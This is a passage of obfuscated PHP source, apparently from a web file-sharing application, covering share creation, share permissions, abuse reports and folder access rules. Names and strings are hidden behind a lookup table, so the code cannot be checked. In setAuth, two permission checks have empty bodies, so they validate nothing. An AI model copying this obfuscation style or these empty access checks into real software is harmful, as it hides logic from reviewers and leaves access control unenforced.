$åÚÓé¯ş[$ÃÇëò¥ï[629]] == $ÃÇëò¥ï[208]) { $ñºÃòÆŒ = $ÃÇëò¥ï[2014]; } Model($ÃÇëò¥ï[599])->eventShare($óÄè‹œ‘, $ñºÃòÆŒ); return; } private function _addShareData($Œ«”—Æ, $ãÔÎå¶ = array(), $ò•Œ…â = false) { $Ÿ­ú„Ù¬ =& $_SERVER[ªÏ§Ë·]; $‘´×ğùÌ = $ò•Œ…â == $Ÿ­ú„Ù¬[1312] ? 0 : USER_ID; $­ñÉä¬ = array($Ÿ­ú„Ù¬[455] => $Œ«”—Æ, $Ÿ­ú„Ù¬[1658] => $‘´×ğùÌ); if ($Œ«”—Æ == 0) { $­ñÉä¬ = array($Ÿ­ú„Ù¬[2015] => $ãÔÎå¶[$Ÿ­ú„Ù¬[1200]], $Ÿ­ú„Ù¬[1658] => $‘´×ğùÌ); } if ($ƒéáš‚ê = $this->where($­ñÉä¬)->find()) { return $ƒéáš‚ê[$Ÿ­ú„Ù¬[631]]; } if ($Œ«”—Æ == 0) { $õÅÛ¶ô¶ = array($Ÿ­ú„Ù¬[42] => get_path_this($ãÔÎå¶[$Ÿ­ú„Ù¬[94]])); } else { $õÅÛ¶ô¶ = Model($Ÿ­ú„Ù¬[853])->sourceInfo($Œ«”—Æ); if (!$õÅÛ¶ô¶) { return !1; } } if (!$ãÔÎå¶[$Ÿ­ú„Ù¬[1567]]) { $ãÔÎå¶[$Ÿ­ú„Ù¬[1567]] = $õÅÛ¶ô¶[$Ÿ­ú„Ù¬[42]]; } $ï‹Ü¼¿‡ = array($Ÿ­ú„Ù¬[1658] => $‘´×ğùÌ, $Ÿ­ú„Ù¬[455] => $Œ«”—Æ, $Ÿ­ú„Ù¬[1567] => $Ÿ­ú„Ù¬[12], $Ÿ­ú„Ù¬[526] => 0, $Ÿ­ú„Ù¬[629] => 0, $Ÿ­ú„Ù¬[1200] => $Ÿ­ú„Ù¬[12], $Ÿ­ú„Ù¬[345] => $Ÿ­ú„Ù¬[12], $Ÿ­ú„Ù¬[914] => $Ÿ­ú„Ù¬[12], $Ÿ­ú„Ù¬[2016] => 0, $Ÿ­ú„Ù¬[2017] => 0, $Ÿ­ú„Ù¬[789] => 0, $Ÿ­ú„Ù¬[2018] => $Ÿ­ú„Ù¬[12], $Ÿ­ú„Ù¬[1999] => $Ÿ­ú„Ù¬[12]); $¦¾ÁÜİ« = explode($Ÿ­ú„Ù¬[60], $Ÿ­ú„Ù¬[2019]); foreach ($¦¾ÁÜİ« as $³Ùµ¢ğ) { if (!isset($ãÔÎå¶[$³Ùµ¢ğ])) { continue; } $ï‹Ü¼¿‡[$³Ùµ¢ğ] = $ãÔÎå¶[$³Ùµ¢ğ]; } $Şí©§ÁÔ = $this->add($ï‹Ü¼¿‡); $óÓ¥×ãŒ = array($Ÿ­ú„Ù¬[1999] => short_id($Şí©§ÁÔ)); $this->where(array($Ÿ­ú„Ù¬[2020] => $Şí©§ÁÔ))->save($óÓ¥×ãŒ); return $Şí©§ÁÔ; } private function _shareAuthSet($îèòæÜ¥, $‘¡Šõí¨) { $å¥ñÄƒá =& $_SERVER[ªÏ§Ë·]; if (!is_array($‘¡Šõí¨)) { return !1; } $ô²¶ûî” = Model($å¥ñÄƒá[1965]); $ô²¶ûî”->where(array($å¥ñÄƒá[631] => $îèòæÜ¥))->delete(); $ÙÈ¾áû¨ = array(); foreach ($‘¡Šõí¨ as $¢±èì•©) { $Æù¢¬–Ã = SourceModel::TYPE_USER; if ($¢±èì•©[$å¥ñÄƒá[449]] == SourceModel::TYPE_GROUP) { $Æù¢¬–Ã = SourceModel::TYPE_GROUP; } $æ¯˜®¥´ = array($å¥ñÄƒá[631] => $îèòæÜ¥, $å¥ñÄƒá[449] => $Æù¢¬–Ã, $å¥ñÄƒá[534] => intval($¢±èì•©[$å¥ñÄƒá[534]]), $å¥ñÄƒá[1961] => 0, $å¥ñÄƒá[2021] => -1); if ($¢±èì•©[$å¥ñÄƒá[1961]]) { $æ¯˜®¥´[$å¥ñÄƒá[1961]] = $¢±èì•©[$å¥ñÄƒá[1961]]; } else { if ($¢±èì•©[$å¥ñÄƒá[2021]]) { $æ¯˜®¥´[$å¥ñÄƒá[2021]] = $¢±èì•©[$å¥ñÄƒá[2021]]; } } $ÙÈ¾áû¨[] = $æ¯˜®¥´; } return $ô²¶ûî”->addAll($ÙÈ¾áû¨, array(), !0); } public function numViewAdd($°®²—) { $›±şí¢Ê =& $_SERVER[ªÏ§Ë·]; $Öë¤†Öì = array($›±şí¢Ê[2020] => $°®²—); $this->where($Öë¤†Öì)->setAdd($›±şí¢Ê[2016]); } public function numDownloadAdd($ÔâŞ¨™à) { $Â»Ü¾²‡ =& $_SERVER[ªÏ§Ë·]; $®™¨¡ç· = array($Â»Ü¾²‡[2020] => $ÔâŞ¨™à); $this->where($®™¨¡ç·)->setAdd($Â»Ü¾²‡[2017]); } protected function shareEdit($ê¢«²À, $¶· ¾ö) { $éÔ‰ğÚÇ =& $_SERVER[ªÏ§Ë·]; $ëšŠ€âŒ = $this->getInfo($ê¢«²À); if (!$ëšŠ€âŒ) { return !1; } $this->_checkLinkShare($¶· ¾ö, $ëšŠ€âŒ); $öıê¦À = array(); $¦åÒˆ×Î = explode($éÔ‰ğÚÇ[60], $éÔ‰ğÚÇ[2022]); foreach ($¦åÒˆ×Î as $Š±ñÎ”¾) { if (!array_key_exists($Š±ñÎ”¾, $¶· ¾ö)) { continue; } $öıê¦À[$Š±ñÎ”¾] = $¶· ¾ö[$Š±ñÎ”¾]; } $this->shareEventAdd($ëšŠ€âŒ[$éÔ‰ğÚÇ[440]], $¶· ¾ö, $éÔ‰ğÚÇ[1827]); $this->where(array($éÔ‰ğÚÇ[2020] => $ê¢«²À))->save($öıê¦À); if (isset($¶· ¾ö[$éÔ‰ğÚÇ[2008]])) { $this->_shareAuthSet($ê¢«²À, $¶· ¾ö[$éÔ‰ğÚÇ[2008]]); } return !0; } private function _checkLinkShare($ó°»İÊ, $Ï“¨íã) { $Œîí±£“ =& $_SERVER[ªÏ§Ë·]; if ($ó°»İÊ[$Œîí±£“[526]] != $Œîí±£“[98]) { return; } $Â‚÷¥ = $Ï“¨íã[$Œîí±£“[97]][$Œîí±£“[440]]; if ($Ï“¨íã[$Œîí±£“[97]][$Œîí±£“[43]] != $Œîí±£“[210]) { $–æ®îÂ = $this->_folderReport($Â‚÷¥); if (!$–æ®îÂ) { return; } show_json(LNG($Œîí±£“[2023]) . $Œîí±£“[2024] . $–æ®îÂ, !1); } $³·Ìİ—Ş = Model($Œîí±£“[853])->fileInfoGet($Ï“¨íã[$Œîí±£“[97]][$Œîí±£“[440]]); if (!$³·Ìİ—Ş) { return; } $„‡¨üÉÅ = $this->shareFileMeta($³·Ìİ—Ş[$Œîí±£“[506]]); if (isset($„‡¨üÉÅ[$Œîí±£“[412]]) && $„‡¨üÉÅ[$Œîí±£“[412]] == $Œîí±£“[98]) { show_json(LNG($Œîí±£“[2025]), !1); } } private function _folderReport($Ø›…ó…ı) { $‡Ç×‰Ú¬ =& $_SERVER[ªÏ§Ë·]; $®ÂĞ¢Š = array($‡Ç×‰Ú¬[506] => array($‡Ç×‰Ú¬[1037], 0), $‡Ç×‰Ú¬[778] => 3); $•‘Õ…Î– = Model($‡Ç×‰Ú¬[2026])->where($®ÂĞ¢Š)->field($‡Ç×‰Ú¬[506])->select(); if (!$•‘Õ…Î–) { return !1; } $•‘Õ…Î– = array_to_keyvalue($•‘Õ…Î–, $‡Ç×‰Ú¬[12], $‡Ç×‰Ú¬[506]); $Ï–ÃÄû¢ = $‡Ç×‰Ú¬[60] . $Ø›…ó…ı . $‡Ç×‰Ú¬[60]; $®ÂĞ¢Š = array($‡Ç×‰Ú¬[506] => array($‡Ç×‰Ú¬[7], $•‘Õ…Î–), $‡Ç×‰Ú¬[549] => array($‡Ç×‰Ú¬[421], "\x25{$Ï–ÃÄû¢}\45"), $‡Ç×‰Ú¬[469] => 0); $¾ßşÎİ‚ = Model($‡Ç×‰Ú¬[853])->where($®ÂĞ¢Š)->field($‡Ç×‰Ú¬[2027])->find(); if (!$¾ßşÎİ‚) { return !1; } $úé¿›‹Ó = substr($¾ßşÎİ‚[$‡Ç×‰Ú¬[549]], strpos($¾ßşÎİ‚[$‡Ç×‰Ú¬[549]], $Ï–ÃÄû¢)); $®ÂĞ¢Š = array($‡Ç×‰Ú¬[440] => array($‡Ç×‰Ú¬[7], trim($úé¿›‹Ó, $‡Ç×‰Ú¬[60]))); $ÁÄÍ×‰” = Model($‡Ç×‰Ú¬[853])->where($®ÂĞ¢Š)->field($‡Ç×‰Ú¬[42])->select(); $™—‘¨œº = array_to_keyvalue($ÁÄÍ×‰”, $‡Ç×‰Ú¬[12], $‡Ç×‰Ú¬[42]); $™—‘¨œº[] = $¾ßşÎİ‚[$‡Ç×‰Ú¬[42]]; return implode($‡Ç×‰Ú¬[8], $™—‘¨œº); } protected function remove($×ŸÖô‹ë) { $Í¨’ªÆÔ =& $_SERVER[ªÏ§Ë·]; if (is_array($×ŸÖô‹ë)) { $×ŸÖô‹ë = array($Í¨’ªÆÔ[7], $×ŸÖô‹ë); } $ŒŠ¼†ÍÎ = array($Í¨’ªÆÔ[631] => $×ŸÖô‹ë); $ôš¥·®Ÿ = $this->where($ŒŠ¼†ÍÎ)->delete(); if ($ôš¥·®Ÿ) { Model($Í¨’ªÆÔ[632])->where(array($Í¨’ªÆÔ[631] => $×ŸÖô‹ë))->delete(); } $­şß ò = is_array($×ŸÖô‹ë) ? $×ŸÖô‹ë[1] : array($×ŸÖô‹ë); for ($ñËÂ´‘¿ = 0; $ñËÂ´‘¿ < count($­şß ò); $ñËÂ´‘¿++) { $î­•öá† = $this->getInfo($­şß ò[$ñËÂ´‘¿]); if ($î­•öá†[$Í¨’ªÆÔ[629]] == $Í¨’ªÆÔ[98]) { Model($Í¨’ªÆÔ[599])->eventShare($î­•öá†[$Í¨’ªÆÔ[440]], $Í¨’ªÆÔ[2014]); } if ($î­•öá†[$Í¨’ªÆÔ[526]] == $Í¨’ªÆÔ[98]) { Model($Í¨’ªÆÔ[599])->eventShare($î­•öá†[$Í¨’ªÆÔ[440]], $Í¨’ªÆÔ[2013]); } } return $ôš¥·®Ÿ; } protected function removeBySource($İÙšœ¼) { $å¡ÑÙî =& $_SERVER[ªÏ§Ë·]; $î«Óüï¿ = array($å¡ÑÙî[455] => array($å¡ÑÙî[456], $İÙšœ¼)); $©€Ğù¥ = $this->field($å¡ÑÙî[631])->where($î«Óüï¿)->select(); $©€Ğù¥ = array_to_keyvalue($©€Ğù¥, $å¡ÑÙî[12], $å¡ÑÙî[631]); if (!$©€Ğù¥) { return; } $î«Óüï¿ = array($å¡ÑÙî[2020] => array($å¡ÑÙî[456], $©€Ğù¥)); $this->where($î«Óüï¿)->delete(); Model($å¡ÑÙî[632])->where($î«Óüï¿)->delete(); } public function listAll($èİâì’Í) { $Êªáş¶‘ =& $_SERVER[ªÏ§Ë·]; $¥Óß–³ = array(); if ($èİâì’Í[$Êªáş¶‘[1667]]) { $¥Óß–³[$Êªáş¶‘[1667]] = $èİâì’Í[$Êªáş¶‘[1667]]; } if ($èİâì’Í[$Êªáş¶‘[788]]) { $Ù¬­»É = $èİâì’Í[$Êªáş¶‘[789]] ? $èİâì’Í[$Êªáş¶‘[789]] : strtotime(date($Êªáş¶‘[2028])); $¥Óß–³[$Êªáş¶‘[211]] = array($Êªáş¶‘[371], array($èİâì’Í[$Êªáş¶‘[788]], $Ù¬­»É)); } if ($èİâì’Í[$Êªáş¶‘[43]]) { $¥Óß–³[$èİâì’Í[$Êªáş¶‘[43]]] = 1; } else { $¥Óß–³[] = array($Êªáş¶‘[526] => array($Êªáş¶‘[1037], 0), $Êªáş¶‘[629] => array($Êªáş¶‘[1037], 0), $Êªáş¶‘[2002] => $Êªáş¶‘[1955]); } if ($èİâì’Í[$Êªáş¶‘[1951]]) { $¥Óß–³[] = array($Êªáş¶‘[1999] => $èİâì’Í[$Êªáş¶‘[1951]], $Êªáş¶‘[1567] => array($Êªáş¶‘[421], "\45{$èİâì’Í[$Êªáş¶‘[1951]]}\x25"), $Êªáş¶‘[2002] => $Êªáş¶‘[1955]); } $’ÓÃÜ¡· = $this->_makeOrder()->where($¥Óß–³)->selectPage(20); if (empty($’ÓÃÜ¡·[$Êªáş¶‘[407]])) { return array(); } $this->_listDataApply($’ÓÃÜ¡·[$Êªáş¶‘[407]]); return $’ÓÃÜ¡·; } public function listDataApply($ÅÇØ§) { $this->_listDataApply($ÅÇØ§); return $ÅÇØ§; } private function _listDataApply(&$Ë¼‰ºññ) { $ÒÕê’¡Ğ =& $_SERVER[ªÏ§Ë·]; $¿‘ÖòÙÁ = array_to_keyvalue($Ë¼‰ºññ, $ÒÕê’¡Ğ[12], $ÒÕê’¡Ğ[1667]); $â¥úîÒ = Model($ÒÕê’¡Ğ[563])->userListInfo(array_unique($¿‘ÖòÙÁ)); $î„È¤Ë = array_to_keyvalue($Ë¼‰ºññ, $ÒÕê’¡Ğ[12], $ÒÕê’¡Ğ[440]); $–‚šşë… = Model($ÒÕê’¡Ğ[853])->sourceListInfo($î„È¤Ë, !0); foreach ($Ë¼‰ºññ as $¡•¨É‰Ì => &$ıáÌª×) { $·ÌíÄôë = $ıáÌª×[$ÒÕê’¡Ğ[1667]]; $ıáÌª×[$ÒÕê’¡Ğ[2029]] = $â¥úîÒ[$·ÌíÄôë] ? $â¥úîÒ[$·ÌíÄôë] : !1; $¤¼¿¾üÉ = $ıáÌª×[$ÒÕê’¡Ğ[440]]; $ıáÌª×[$ÒÕê’¡Ğ[97]] = $–‚šşë…[$¤¼¿¾üÉ] ? $–‚šşë…[$¤¼¿¾üÉ] : !1; if ($ıáÌª×[$ÒÕê’¡Ğ[97]][$ÒÕê’¡Ğ[469]] == $ÒÕê’¡Ğ[98]) { unset($Ë¼‰ºññ[$¡•¨É‰Ì]); } if ($ıáÌª×[$ÒÕê’¡Ğ[97]] != $ÒÕê’¡Ğ[208] && !$ıáÌª×[$ÒÕê’¡Ğ[97]]) { unset($Ë¼‰ºññ[$¡•¨É‰Ì]); } } unset($ıáÌª×); $Ë¼‰ºññ = array_values($Ë¼‰ºññ); } private function _makeOrder($âÓêŠ«½ = '') { $‹ŸÔĞ’ƒ =& $_SERVER[ªÏ§Ë·]; $êÒåŞí = array($‹ŸÔĞ’ƒ[211], $‹ŸÔĞ’ƒ[789], $‹ŸÔĞ’ƒ[2016], $‹ŸÔĞ’ƒ[2017]); $ş°ôÚŠ• = array($‹ŸÔĞ’ƒ[488] => $‹ŸÔĞ’ƒ[489], $‹ŸÔĞ’ƒ[490] => $‹ŸÔĞ’ƒ[491]); $¯³‘×¿’ = Input::get($‹ŸÔĞ’ƒ[495], $‹ŸÔĞ’ƒ[7], $‹ŸÔĞ’ƒ[461], $êÒåŞí); $Èïé™ = Input::get($‹ŸÔĞ’ƒ[496], $‹ŸÔĞ’ƒ[7], $‹ŸÔĞ’ƒ[2030], array($‹ŸÔĞ’ƒ[1948], $‹ŸÔĞ’ƒ[490])); $Èïé™ = $ş°ôÚŠ•[$Èïé™]; $âÓêŠ«½ = $âÓêŠ«½ . "{$¯³‘×¿’}\x20{$Èïé™}"; return $this->order($âÓêŠ«½); } public function reportAdd($Íıö²ñ¸) { $Î¡àš¡ =& $_SERVER[ªÏ§Ë·]; $ÏÇŒçññ = array($Î¡àš¡[631] => $Íıö²ñ¸[$Î¡àš¡[631]], $Î¡àš¡[1667] => USER_ID); if (Model($Î¡àš¡[2026])->where($ÏÇŒçññ)->find()) { return !1; } $š¢¶éç— = array($Î¡àš¡[631] => $Íıö²ñ¸[$Î¡àš¡[631]], $Î¡àš¡[1567] => $Íıö²ñ¸[$Î¡àš¡[1567]], $Î¡àš¡[440] => $Íıö²ñ¸[$Î¡àš¡[440]], $Î¡àš¡[506] => $Íıö²ñ¸[$Î¡àš¡[506]], $Î¡àš¡[1667] => USER_ID, $Î¡àš¡[43] => $Íıö²ñ¸[$Î¡àš¡[43]], $Î¡àš¡[491] => $Íıö²ñ¸[$Î¡àš¡[491]]); return Model($Î¡àš¡[2026])->add($š¢¶éç—); } public function reportList($’èŠ‘·‡) { $–©ıÊ =& $_SERVER[ªÏ§Ë·]; $æÕòÅ“Ù = array(); if ($’èŠ‘·‡[$–©ıÊ[788]]) { $é»€€­· = $’èŠ‘·‡[$–©ıÊ[789]] ? $’èŠ‘·‡[$–©ıÊ[789]] : strtotime(date($–©ıÊ[2028])); $æÕòÅ“Ù[$–©ıÊ[211]] = array($–©ıÊ[371], array($’èŠ‘·‡[$–©ıÊ[788]], $é»€€­·)); } if (isset($’èŠ‘·‡[$–©ıÊ[43]]) && in_array($’èŠ‘·‡[$–©ıÊ[43]], array($–©ıÊ[98], $–©ıÊ[475], $–©ıÊ[2031], $–©ıÊ[2032], $–©ıÊ[2033]))) { $æÕòÅ“Ù[$–©ıÊ[43]] = $’èŠ‘·‡[$–©ıÊ[43]]; } if (isset($’èŠ‘·‡[$–©ıÊ[778]]) && in_array($’èŠ‘·‡[$–©ıÊ[778]], array($–©ıÊ[208], $–©ıÊ[98], $–©ıÊ[475], $–©ıÊ[2031]))) { $æÕòÅ“Ù[$–©ıÊ[778]] = $’èŠ‘·‡[$–©ıÊ[778]]; } $„‘ù€½ = Input::get($–©ıÊ[496], $–©ıÊ[7], $–©ıÊ[2030], array($–©ıÊ[1948], $–©ıÊ[490])); $Í˜§‘¸É = array($–©ıÊ[488] => $–©ıÊ[489], $–©ıÊ[490] => $–©ıÊ[491]); $åš…À›· = $–©ıÊ[2034] . $Í˜§‘¸É[$„‘ù€½]; $ƒùÃÖè’ = Model($–©ıÊ[2026])->where($æÕòÅ“Ù)->order($åš…À›·)->selectPage(20); if (empty($ƒùÃÖè’[$–©ıÊ[407]])) { return array(); } $”¸™õ„„ = array_to_keyvalue_group($ƒùÃÖè’[$–©ıÊ[407]], $–©ıÊ[778], $–©ıÊ[631]); if (!empty($”¸™õ„„[0])) { $’èŠ‘·‡ = $”¸™õ„„[0]; $æÕòÅ“Ù = array($–©ıÊ[631] => array($–©ıÊ[7], $’èŠ‘·‡)); $Æ’Ğ¦ùç = $this->where($æÕòÅ“Ù)->field($–©ıÊ[631])->select(); $Æ’Ğ¦ùç = array_to_keyvalue($Æ’Ğ¦ùç, $–©ıÊ[12], $–©ıÊ[631]); $äåÚ’É = array_diff($’èŠ‘·‡, $Æ’Ğ¦ùç); if (!empty($äåÚ’É)) { foreach ($ƒùÃÖè’[$–©ıÊ[407]] as $ñÊĞÒ => $Îñ—Ç± ) { if (in_array($Îñ—Ç± [$–©ıÊ[631]], $äåÚ’É)) { unset($ƒùÃÖè’[$–©ıÊ[407]][$ñÊĞÒ]); } } } } $this->_listDataApply($ƒùÃÖè’[$–©ıÊ[407]]); return $ƒùÃÖè’; } public function reportStatus($â‘ğè«…) { $šˆ²†‰å =& $_SERVER[ªÏ§Ë·]; $Îï…¹ªª = array($šˆ²†‰å[437] => $â‘ğè«…[$šˆ²†‰å[437]]); $¸Õ™½ï = Model($šˆ²†‰å[2026])->where($Îï…¹ªª)->field($šˆ²†‰å[2035])->find(); if (!$¸Õ™½ï) { return !1; } $åäö„µÖ = array($šˆ²†‰å[778] => $â‘ğè«…[$šˆ²†‰å[778]]); if ($â‘ğè«…[$šˆ²†‰å[778]] == $šˆ²†‰å[2031] && $¸Õ™½ï[$šˆ²†‰å[778]] == $šˆ²†‰å[2031]) { $åäö„µÖ[$šˆ²†‰å[778]] = 0; } $½®ğ÷ÎÌ = Model($šˆ²†‰å[2026])->where($Îï…¹ªª)->save($åäö„µÖ); if ($â‘ğè«…[$šˆ²†‰å[778]] == $šˆ²†‰å[475]) { if ($¸Õ™½ï[$šˆ²†‰å[506]] != $šˆ²†‰å[208] && $this->shareFileMeta($¸Õ™½ï[$šˆ²†‰å[506]])) { $this->shareFileMeta($¸Õ™½ï[$šˆ²†‰å[506]], 0); } $this->remove($¸Õ™½ï[$šˆ²†‰å[631]]); return !0; } if ($½®ğ÷ÎÌ && $â‘ğè«…[$šˆ²†‰å[778]] == $šˆ²†‰å[2031]) { $µ­ÊéåŒ = $åäö„µÖ[$šˆ²†‰å[778]] == $šˆ²†‰å[2031] ? 1 : 0; $this->shareFileMeta($¸Õ™½ï[$šˆ²†‰å[506]], $µ­ÊéåŒ); $this->removeByFile($¸Õ™½ï[$šˆ²†‰å[506]]); } return $½®ğ÷ÎÌ; } private function removeByFile($Ñ»ÜñŸı) { $”…ÆÙÔÕ =& $_SERVER[ªÏ§Ë·]; $ûı‡ëÃ¡ = Model($”…ÆÙÔÕ[853])->where(array($”…ÆÙÔÕ[506] => $Ñ»ÜñŸı))->field($”…ÆÙÔÕ[440])->select(); $§È§Õ¶Š = array_to_keyvalue($ûı‡ëÃ¡, $”…ÆÙÔÕ[12], $”…ÆÙÔÕ[440]); $ò¸…äòĞ = array($”…ÆÙÔÕ[440] => array($”…ÆÙÔÕ[7], $§È§Õ¶Š), $”…ÆÙÔÕ[526] => 1); $ûı‡ëÃ¡ = $this->where($ò¸…äòĞ)->field($”…ÆÙÔÕ[631])->select(); if (empty($ûı‡ëÃ¡)) { return; } $Ï¶ÖÖ©• = array_to_keyvalue($ûı‡ëÃ¡, $”…ÆÙÔÕ[12], $”…ÆÙÔÕ[631]); $this->remove($Ï¶ÖÖ©•); } private function shareFileMeta($‰Ÿ¥§£, $Ëú…í¾ê = null) { $Ú„ª·è =& $_SERVER[ªÏ§Ë·]; $‚¬šç¡ = array($Ú„ª·è[506] => $‰Ÿ¥§£, $Ú„ª·è[104] => $Ú„ª·è[2036]); if (is_null($Ëú…í¾ê)) { return Model($Ú„ª·è[2037])->where($‚¬šç¡)->find(); } $‚¬šç¡[$Ú„ª·è[412]] = $Ëú…í¾ê; Model($Ú„ª·è[2037])->add($‚¬šç¡, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\165\162\x63\x65\x5f\141\165\164\x68"; public function getAuth($ôƒ¦Âúú) { $×ƒî¤‰ =& $_SERVER[ªÏ§Ë·]; $úãšĞŠ = $this->sourceAuthSelect($ôƒ¦Âúú); $ç¼ÇÛô˜ = array(); $ëë­²Êò = array(); $ØûÛº”° = 2 << 25; foreach ($úãšĞŠ as $ÇÁäñ®Ê) { $½ŸœßÂ˜ = Model($×ƒî¤‰[536])->listData($ÇÁäñ®Ê[$×ƒî¤‰[1961]]); if (!$½ŸœßÂ˜) { continue; } $ç¼ÇÛô˜[] = $ÇÁäñ®Ê; $øğî¬¦µ = 0; if ($ÇÁäñ®Ê[$×ƒî¤‰[449]] == SourceModel::TYPE_GROUP) { $øğî¬¦µ = $ØûÛº”° * 2; } if ($ÇÁäñ®Ê[$×ƒî¤‰[449]] == SourceModel::TYPE_USER) { $øğî¬¦µ = $ØûÛº”°; } if ($ÇÁäñ®Ê[$×ƒî¤‰[449]] == SourceModel::TYPE_USER && $ÇÁäñ®Ê[$×ƒî¤‰[534]] == $×ƒî¤‰[208]) { $øğî¬¦µ = 0; } $ëë­²Êò[] = $½ŸœßÂ˜[$×ƒî¤‰[451]] + $øğî¬¦µ; } array_multisort($ëë­²Êò, SORT_DESC, $ç¼ÇÛô˜); return $ç¼ÇÛô˜; } public function sourceAuthSelect($Ôµ¬€›­) { $‰•¯î˜Î =& $_SERVER[ªÏ§Ë·]; static $ëÀÃ§º = array(); $±½²›©Ä = is_array($Ôµ¬€›­) ? !1 : !0; if ($±½²›©Ä) { $Ôµ¬€›­ = array($Ôµ¬€›­); } $¥£ùöÈ = array(); foreach ($Ôµ¬€›­ as $ÈªÂÂ¸) { if (isset($ëÀÃ§º[$ÈªÂÂ¸])) { $¥£ùöÈ[$ÈªÂÂ¸] = $ëÀÃ§º[$ÈªÂÂ¸]; } } if (count($¥£ùöÈ) == count($Ôµ¬€›­)) { return $±½²›©Ä ? $¥£ùöÈ[$Ôµ¬€›­[0]] : $¥£ùöÈ; } $â€é‚ßˆ = $‰•¯î˜Î[2038]; $˜Âşİ¤‘ = array($‰•¯î˜Î[440] => array($‰•¯î˜Î[7], $Ôµ¬€›­)); $ç¥à“ŠÕ = $this->field($â€é‚ßˆ)->order($‰•¯î˜Î[437])->where($˜Âşİ¤‘)->select(); $Çäó­ÎØ = array_to_keyvalue_group($ç¥à“ŠÕ, $‰•¯î˜Î[440]); foreach ($Ôµ¬€›­ as $ÈªÂÂ¸) { $ëÀÃ§º[$ÈªÂÂ¸] = $Çäó­ÎØ[$ÈªÂÂ¸] ? $Çäó­ÎØ[$ÈªÂÂ¸] : array(); } if ($±½²›©Ä) { return $ç¥à“ŠÕ; } return $Çäó­ÎØ; } public function setAuth($­ğõŒ¦, $ŸôñŞÓ) { $¥’êî” =& $_SERVER[ªÏ§Ë·]; $ÃÌğçŞÛ = Model($¥’êî”[1358])->sourceInfo($­ğõŒ¦); if (!$ÃÌğçŞÛ) { return !1; } if ($ÃÌğçŞÛ[$¥’êî”[449]] != SourceModel::TYPE_GROUP) { return !1; } $¨’Éµí£ = 1; $ğı‹’³ä = $ÃÌğçŞÛ[$¥’êî”[534]]; if ($ğı‹’³ä != $¨’Éµí£) { $›Õ‘œ¡Õ = array($¥’êî”[1857] => $ğı‹’³ä); $ºúÀ²ğ = Model($¥’êî”[1947])->field($¥’êî”[1667])->where($›Õ‘œ¡Õ)->select(); $ºúÀ²ğ = array_to_keyvalue($ºúÀ²ğ, $¥’êî”[12], $¥’êî”[1667]); } $¿¤ßÀş = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $©âÈ§±× = array(); foreach ($ŸôñŞÓ as $°í¸ªºÔ) { if (!in_array($°í¸ªºÔ[$¥’êî”[449]], $¿¤ßÀş)) { show_json(LNG($¥’êî”[2039]), !1); } if ($ğı‹’³ä != $¨’Éµí£) { if ($°í¸ªºÔ[$¥’êî”[449]] == SourceModel::TYPE_GROUP) { } if ($°í¸ªºÔ[$¥’êî”[534]] != 0 && !in_array($°í¸ªºÔ[$¥’êî”[534]], $ºúÀ²ğ)) { } } if ($°í¸ªºÔ[$¥’êî”[534]] == 0) { $°í¸ªºÔ[$¥’êî”[449]] = SourceModel::TYPE_USER; } $©âÈ§±×[] = array($¥’êî”[440] => $­ğõŒ¦, $¥’êî”[449] => intval($°í¸ªºÔ[$¥’êî”[449]]), $¥’êî”[534] => intval($°í¸ªºÔ[$¥’êî”[534]]), $¥’êî”[1961] => intval($°í¸ªºÔ[$¥’êî”[1961]]) ? intval($°í¸ªºÔ[$¥’êî”[1961]]) : 0, $¥’êî”[2021] => intval($°í¸ªºÔ[$¥’êî”[2021]]) ? intval($°í¸ªºÔ[$¥’êî”[2021]]) : -1); } $this->where(array($¥’êî”[455] => $­ğõŒ¦))->delete(); $this->addAll($©âÈ§±×); return !0; } public function authClear($×È÷­Ãí) { $İàÑéû§ =& $_SERVER[ªÏ§Ë·]; $«“±˜„» = Model($İàÑéû§[1358])->sourceInfo($×È÷­Ãí); $Ò†æÈÎå = array($×È÷­Ãí); if ($«“±˜„»[$İàÑéû§[448]] == $İàÑéû§[98]) { $Ü¶¨à…ù = array($İàÑéû§[618] => array($İàÑéû§[578], $«“±˜„»[$İàÑéû§[549]] . $×È÷­Ãí . $İàÑéû§[579])); $Ò†æÈÎå = Model($İàÑéû§[1358])->field($İàÑéû§[455])->where($Ü¶¨à…ù)->getField($İàÑéû§[440], !0); $Ò†æÈÎå[] = $×È÷­Ãí; } $this->where(array($İàÑéû§[455] => array($İàÑéû§[456], $Ò†æÈÎå)))->delete(); return !0; } public function getAllChildren($Û„ïï) { $ù°ÅÅ´‹ =& $_SERVER[ªÏ§Ë·]; $¢óÖéúÒ = Model($ù°ÅÅ´‹[1358])->sourceInfo($Û„ïï); if ($¢óÖéúÒ[$ù°ÅÅ´‹[448]] != $ù°ÅÅ´‹[98]) { return $this->sourceListAuth(array($Û„ïï)); } if ($¢óÖéúÒ[$ù°ÅÅ´‹[449]] != SourceModel::TYPE_GROUP) { return array(); } $°¶æÕ®¡ = 1; $˜Â½† = array($Û„ïï); if ($¢óÖéúÒ[$ù°ÅÅ´‹[470]] == $ù°ÅÅ´‹[208] && $¢óÖéúÒ[$ù°ÅÅ´‹[534]] != $°¶æÕ®¡) { $˜Â½† = $this->groupChidldAllRootSource($¢óÖéúÒ[$ù°ÅÅ´‹[534]]); } $Ö±õÁŞŠ = $this->field($ù°ÅÅ´‹[440])->group($ù°ÅÅ´‹[440])->select(); $Ö±õÁŞŠ = array_to_keyvalue($Ö±õÁŞŠ, $ù°ÅÅ´‹[12], $ù°ÅÅ´‹[440]); if (!$Ö±õÁŞŠ) { return array(); } $¯´¸â©™ = $ù°ÅÅ´‹[2040]; $ŞÙßî½· = array($ù°ÅÅ´‹[440] => array($ù°ÅÅ´‹[7], $Ö±õÁŞŠ), $ù°ÅÅ´‹[469] => $ù°ÅÅ´‹[208]); $ÙıÌ×äù = Model($ù°ÅÅ´‹[853])->field($¯´¸â©™)->where($ŞÙßî½·)->select(); $ôñãÈÊò = array($Û„ïï); foreach ($ÙıÌ×äù as $–±§¨à) { foreach ($˜Â½† as $ÛøÌÆ®) { $ºÔé§å = $ù°ÅÅ´‹[60] . $ÛøÌÆ® . $ù°ÅÅ´‹[60]; $›’ô—ñ¸ = $–±§¨à[$ù°ÅÅ´‹[549]] . $–±§¨à[$ù°ÅÅ´‹[440]] . $ù°ÅÅ´‹[60]; if (strstr($›’ô—ñ¸, $ºÔé§å)) { $ôñãÈÊò[] = $–±§¨à[$ù°ÅÅ´‹[440]]; break; } } } return $this->sourceListAuth($ôñãÈÊò); } private function sourceListAuth($°Â¿©»ò) { 